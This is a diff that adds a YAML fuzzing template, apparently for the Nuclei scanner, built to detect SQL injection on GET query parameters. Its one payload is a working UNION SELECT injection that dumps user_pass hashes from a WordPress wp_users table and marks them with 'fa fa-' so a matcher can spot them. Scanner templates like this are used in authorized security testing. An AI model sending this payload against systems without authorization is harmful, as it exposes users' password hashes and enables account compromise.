@@ -1,0 +1,39 @@
+id: fuzz-sqli-union-select
+
+info:
+  name: SQL Injection Detection - UNION SELECT
+  author: netbaan
+  severity: high
+  description: |
+    This template is designed to detect SQL Injection vulnerabilities using a UNION SELECT payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      sqli:
+        - "f'1) UNION SELECT 1,\\{title\\},concat(\"fa fa-\",user_pass),3,4,5,6 from wp_users%23"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{sqli}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "fa fa-"
+
+      - type: status
+        status:
+          - 200
+          - 500  # Example statuses that may indicate potential SQL errors
